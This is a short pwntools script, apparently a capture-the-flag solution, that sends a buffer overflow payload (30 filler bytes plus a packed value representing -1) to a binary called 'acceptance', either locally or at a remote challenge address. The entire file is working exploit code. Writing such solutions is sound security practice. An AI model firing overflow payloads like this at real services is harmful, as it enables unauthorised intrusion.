#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./acceptance')
context.log_level = "debug"

if args.REMOTE:
    p = remote('20.169.252.240', 4000)
else:
    p = process(binary.path)

# gdb.attach(p)

p.recvuntil(b"Help him: ")

payload  = b""
payload += b"A"*30
payload += p64(0xFFFFFFFFFFFF) # Represent -1

p.sendline(payload)
p.stream()
p.close()